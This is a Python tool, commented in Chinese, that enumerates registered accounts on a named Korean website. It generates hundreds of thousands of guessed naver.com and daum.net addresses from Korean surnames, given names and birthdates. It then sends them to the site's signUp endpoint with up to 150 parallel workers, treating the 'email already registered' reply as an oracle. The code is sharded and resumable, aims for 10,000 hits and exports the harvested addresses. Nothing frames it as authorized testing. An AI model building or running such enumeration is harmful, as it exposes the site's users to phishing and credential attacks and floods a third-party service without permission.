#!/usr/bin/env python3
"""us-campus 邮箱枚举 v2: 去重续跑 + naver精简字典 + 分片 + 高并发 signUp 预言机"""
import argparse
import fcntl
import itertools
import json
import re
import ssl
import threading
import time
import urllib.error
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import date, datetime
from http.cookiejar import CookieJar
from pathlib import Path
from urllib.request import HTTPCookieProcessor, HTTPSHandler, Request, build_opener

BASE = Path("/data/automation/results/us-campus.co.kr")
STATE_DIR = BASE / "email_enum_state"
GLOBAL_TESTED = STATE_DIR / "tested.txt"
GLOBAL_HITS = STATE_DIR / "hits_all.jsonl"

ALL_SURNAMES = [
    "kim", "lee", "park", "choi", "jung", "jeong", "kang", "cho", "jo", "yoon", "yun", "jang", "lim", "im",
    "han", "oh", "seo", "shin", "kwon", "hwang", "ahn", "an", "song", "hong", "yu", "yoo", "moon", "mun",
    "son", "bae", "baek", "heo", "hur", "nam", "ha", "kwak", "gu", "ko", "go", "jeon", "jun", "ryu", "noh",
    "roh", "cha", "min", "jin", "sim", "shim", "yang", "won", "byun", "byeon", "chung", "woo", "gil", "gang",
    "gong", "kwang", "ma", "mok", "ban", "bang", "bong", "seok", "suk", "shin", "sok", "um", "uhm", "eom",
    "yeo", "yo", "ok", "oon", "wook", "pyo", "hae", "hyun", "in", "jae", "chae", "cheon", "chun",
]

SHARD_GROUPS = [
    ["kim", "lee", "park", "choi"],
    ["jung", "jeong", "kang", "cho", "jo", "yoon", "yun"],
    ["jang", "lim", "im", "han", "oh", "seo", "shin", "kwon", "hwang"],
    None,  # shard 3 = rest
]

GIVEN = [
    "min", "jun", "soo", "su", "young", "jin", "hyun", "hyeon", "woo", "ho", "ji", "yeon", "seo", "yoon", "yun",
    "ha", "bin", "gyu", "kyu", "seok", "suk", "won", "chan", "sung", "seong", "dong", "jae", "tae", "sang", "chul",
    "cheol", "hee", "hui", "eun", "in", "ah", "a", "ri", "rae", "kyung", "gyeong", "hye", "mi", "ye", "bo", "na",
    "minjun", "minjae", "seojun", "jiho", "jiwoo", "doyun", "yejun", "siwoo", "hajun", "minseo", "haeun", "jimin",
    "jisoo", "sujin", "hyunwoo", "sangmin", "jaehyun", "donghyun", "seungmin", "seunghyun", "taehyun", "jihoon",
    "junho", "sungmin", "jonghyun", "minsu", "minho", "jieun", "hyunju", "eunji", "yujin", "yuna", "jiyeon",
    "sohee", "juhee", "haneul", "areum", "sora", "nari", "bora", "gunwoo", "yong", "chaeun", "seoah", "haru",
    "siyun", "jiyun", "yejin", "hyerin", "dahye", "seungho", "youngjae", "jungmin", "kyungmin", "hyunsoo",
]

COMMONS = [
    "user", "love", "happy", "money", "stock", "king", "sky", "star", "moon", "sun", "korea", "seoul", "campus",
    "hello", "world", "apple", "blue", "red", "student", "vip", "gold",
]

CTX = ssl.create_default_context()


class FileSet:
    def __init__(self, path: Path):
        self.path = path
        self.path.parent.mkdir(parents=True, exist_ok=True)
        self._lock = threading.Lock()
        self.data = set()
        if self.path.exists():
            for line in self.path.read_text(encoding="utf-8", errors="ignore").splitlines():
                e = line.strip().lower()
                if e:
                    self.data.add(e)

    def __contains__(self, item):
        return item.lower() in self.data

    def add(self, item: str):
        e = item.lower()
        with self._lock:
            if e in self.data:
                return False
            self.data.add(e)
            with open(self.path, "a", encoding="utf-8") as f:
                fcntl.flock(f, fcntl.LOCK_EX)
                f.write(e + "\n")
                fcntl.flock(f, fcntl.LOCK_UN)
            return True


def shard_surnames(shard: int, shards: int):
    if shards != 4:
        n = len(ALL_SURNAMES)
        size = (n + shards - 1) // shards
        return ALL_SURNAMES[shard * size : (shard + 1) * size]
    if shard >= 3:
        used = set(SHARD_GROUPS[0] + SHARD_GROUPS[1] + SHARD_GROUPS[2])
        return [s for s in ALL_SURNAMES if s not in used]
    return SHARD_GROUPS[shard]


def build_slim_candidates(surnames, tested: FileSet, seen_hit: set):
    cands = []
    years2 = [f"{y:02d}" for y in range(70, 100)] + [f"{y:02d}" for y in range(0, 10)]
    years4 = [str(y) for y in range(1975, 2006)]
    top = surnames[: min(25, len(surnames))]

    # --- 高命中经典模式 (naver) ---
    for s, g, yr in itertools.product(surnames, GIVEN, years2):
        for loc in (s + g + yr, g + s + yr):
            cands.append(f"{loc}@naver.com")

    for s in top:
        for y in range(1975, 2008):
            for m in range(1, 13):
                for d in range(1, 32):
                    try:
                        date(y, m, d)
                    except ValueError:
                        continue
                    bd = f"{y % 100:02d}{m:02d}{d:02d}"
                    cands.append(f"{s}{bd}@naver.com")

    for s in surnames:
        for y in years2:
            cands.append(f"{s}{y}@naver.com")
            for n in range(0, 100):
                cands.append(f"{s}{y}{n:02d}@naver.com")
        for n in range(1000, 10000):
            cands.append(f"{s}{n}@naver.com")

    for s, g in itertools.product(surnames, GIVEN[:40]):
        for loc in (s + g, g + s, s + g + "1", s + g + "12"):
            cands.append(f"{loc}@naver.com")

    # --- phase2: 旧版未覆盖的新模式 ---
    phase2_s = surnames[: min(8, len(surnames))]
    for s, g in itertools.product(phase2_s, GIVEN[:30]):
        for y4 in years4:
            cands.append(f"{s}{g}{y4}@naver.com")
            cands.append(f"{g}{s}{y4}@naver.com")
        for y in years2:
            cands.append(f"{s}{g}{y}@daum.net")
            cands.append(f"{g}{s}{y}@daum.net")

    for s in top[:12]:
        for y in range(1975, 2008):
            for m in range(1, 13):
                for d in range(1, 32):
                    try:
                        date(y, m, d)
                    except ValueError:
                        continue
                    bd = f"{y % 100:02d}{m:02d}{d:02d}"
                    cands.append(f"{s}{bd}@daum.net")

    for c in COMMONS:
        for n in range(1000, 10000):
            cands.append(f"{c}{n}@naver.com")
        for yr in years2:
            for n in range(100, 1000):
                cands.append(f"{c}{yr}{n}@naver.com")

    seen = set()
    out = []
    for e in cands:
        e = e.lower()
        if e in seen or e in tested or e in seen_hit:
            continue
        seen.add(e)
        out.append(e)
    return out


def load_hits():
    hits = []
    seen = set()
    sources = [GLOBAL_HITS] if GLOBAL_HITS.exists() else []
    sources += sorted(BASE.glob("email_enum*/hits.jsonl"))
    for p in sources:
        if not p.exists():
            continue
        for line in p.read_text(encoding="utf-8", errors="ignore").splitlines():
            try:
                r = json.loads(line)
                em = (r.get("email") or "").lower()
                if em and em not in seen:
                    seen.add(em)
                    hits.append(r)
            except Exception:
                pass
    return hits, seen


def append_global_hit(rec: dict):
    GLOBAL_HITS.parent.mkdir(parents=True, exist_ok=True)
    with open(GLOBAL_HITS, "a", encoding="utf-8") as f:
        fcntl.flock(f, fcntl.LOCK_EX)
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
        fcntl.flock(f, fcntl.LOCK_UN)


def export_results(out_dir: Path, hits):
    out_dir.mkdir(parents=True, exist_ok=True)
    (out_dir / "EMAIL_LINKS.md").write_text(
        "# 注册邮箱\n\n" + "\n".join(f'{i}. [{r["email"]}](mailto:{r["email"]})' for i, r in enumerate(hits, 1)) + "\n",
        encoding="utf-8",
    )
    with open(out_dir / "registered_emails.csv", "w", encoding="utf-8-sig") as f:
        f.write("email,message\n")
        for r in hits:
            f.write(f"{r['email']},{(r.get('message') or '').replace(',', ' ')}\n")
    (out_dir / "registered_emails.json").write_text(json.dumps(hits, indent=2, ensure_ascii=False), encoding="utf-8")


def run_shard(args):
    STATE_DIR.mkdir(parents=True, exist_ok=True)
    shard_dir = STATE_DIR / f"shard_{args.shard}"
    shard_dir.mkdir(parents=True, exist_ok=True)

    out_dir = BASE / f"email_enum_fast_s{args.shard}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    out_dir.mkdir(parents=True, exist_ok=True)
    hits_path = out_dir / "hits.jsonl"
    prog_path = out_dir / "progress.txt"
    state_path = shard_dir / "state.json"
    resume_path = shard_dir / "resume.idx"
    tested_shard = FileSet(shard_dir / "tested_shard.txt")
    tested_global = FileSet(GLOBAL_TESTED)

    hits, seen_hit = load_hits()
    surnames = shard_surnames(args.shard, args.shards)
    print(f"shard={args.shard}/{args.shards} surnames={len(surnames)} workers={args.workers}", flush=True)
    print(f"seed_hits={len(hits)} global_tested={len(tested_global.data)}", flush=True)

    cands = build_slim_candidates(surnames, tested_global, seen_hit)
    print(f"candidates={len(cands)} out={out_dir}", flush=True)
    (out_dir / "candidates_count.txt").write_text(str(len(cands)))
    (out_dir / "meta.json").write_text(
        json.dumps({"shard": args.shard, "shards": args.shards, "surnames": surnames, "workers": args.workers}, indent=2),
        encoding="utf-8",
    )

    with open(hits_path, "w", encoding="utf-8") as f:
        for r in hits:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")

    start_idx = 0
    if resume_path.exists():
        try:
            start_idx = int(resume_path.read_text().strip())
        except Exception:
            start_idx = 0
    if start_idx:
        cands = cands[start_idx:]
        print(f"resume from idx {start_idx} remain {len(cands)}", flush=True)

    lock = threading.Lock()
    tested = 0
    errors = 0
    retried_ok = 0
    start = time.time()
    stop_flag = threading.Event()
    tls = threading.local()

    def get_op(force=False):
        if force or getattr(tls, "op", None) is None or getattr(tls, "n", 0) >= 400:
            tls.op = build_opener(HTTPCookieProcessor(CookieJar()), HTTPSHandler(context=CTX))
            tls.n = 0
            try:
                tls.op.open(Request("https://us-campus.co.kr/member/join", headers={"User-Agent": "Mozilla/5.0"}), timeout=8)
            except Exception:
                pass
        tls.n += 1
        return tls.op

    def do_req(em, op):
        data = {
            "email": em,
            "password": "Test1234!",
            "confirmed": "Test1234!",
            "name": "t",
            "cellphone": "01055550000",
            "countryCode": "82",
            "cellphoneCertCode": "X",
            "cellphoneCertKey": "X",
        }
        req = Request(
            "https://us-campus.co.kr/member/signUp",
            urllib.parse.urlencode(data).encode(),
            method="POST",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "application/json",
                "Referer": "https://us-campus.co.kr/member/join",
                "Origin": "https://us-campus.co.kr",
                "User-Agent": "Mozilla/5.0",
            },
        )
        try:
            r = op.open(req, timeout=12)
            return json.loads(r.read().decode("utf-8", "replace"))
        except urllib.error.HTTPError as e:
            return json.loads(e.read().decode("utf-8", "replace"))

    def check(em):
        nonlocal tested, errors, retried_ok
        if stop_flag.is_set():
            return
        j = None
        for attempt in range(args.retries):
            if stop_flag.is_set():
                return
            op = get_op(force=(attempt > 0))
            try:
                j = do_req(em, op)
                if attempt > 0:
                    with lock:
                        retried_ok += 1
                break
            except Exception:
                tls.op = None
                time.sleep(0.05 * (attempt + 1))
        with lock:
            tested += 1
            tested_shard.add(em)
            tested_global.add(em)
            if j is None:
                errors += 1
                return
            msg = j.get("message") or ""
            if "이미" in msg and "이메일" in msg:
                if em not in seen_hit:
                    seen_hit.add(em)
                    rec = {"email": em, "message": msg, "ts": time.time(), "shard": args.shard}
                    hits.append(rec)
                    append_global_hit(rec)
                    with open(hits_path, "a", encoding="utf-8") as f:
                        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
                    print(f"HIT shard{args.shard} total={len(hits)} {em}", flush=True)
                    if len(hits) >= args.target:
                        stop_flag.set()

    batch = 3000
    idx = 0
    total = len(cands)
    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        while idx < total and not stop_flag.is_set():
            chunk = cands[idx : idx + batch]
            idx += len(chunk)
            futs = [ex.submit(check, em) for em in chunk]
            for fut in as_completed(futs):
                if stop_flag.is_set():
                    break
                try:
                    fut.result()
                except Exception:
                    pass
            cur_idx = start_idx + idx
            resume_path.write_text(str(cur_idx), encoding="utf-8")
            elapsed = time.time() - start
            rps = tested / elapsed if elapsed else 0
            line = (
                f"shard={args.shard} progress idx={cur_idx} batch_tested={tested} "
                f"hits={len(hits)} errors={errors} retried_ok={retried_ok} rps={rps:.1f} elapsed={elapsed:.0f}s"
            )
            print(line, flush=True)
            prog_path.write_text(line + "\n", encoding="utf-8")
            state_path.write_text(
                json.dumps(
                    {
                        "shard": args.shard,
                        "idx": cur_idx,
                        "tested": tested,
                        "hits": len(hits),
                        "errors": errors,
                        "rps": rps,
                        "out": str(out_dir),
                    },
                    indent=2,
                ),
                encoding="utf-8",
            )
            export_results(out_dir, hits)

    export_results(out_dir, hits)
    print(f"FINISHED shard={args.shard} hits={len(hits)} tested={tested} errors={errors} out={out_dir}", flush=True)


def main():
    ap = argparse.ArgumentParser(description="us-campus fast email enum")
    ap.add_argument("--shard", type=int, default=0)
    ap.add_argument("--shards", type=int, default=4)
    ap.add_argument("--workers", type=int, default=150)
    ap.add_argument("--target", type=int, default=10000)
    ap.add_argument("--retries", type=int, default=3)
    run_shard(ap.parse_args())


if __name__ == "__main__":
    main()
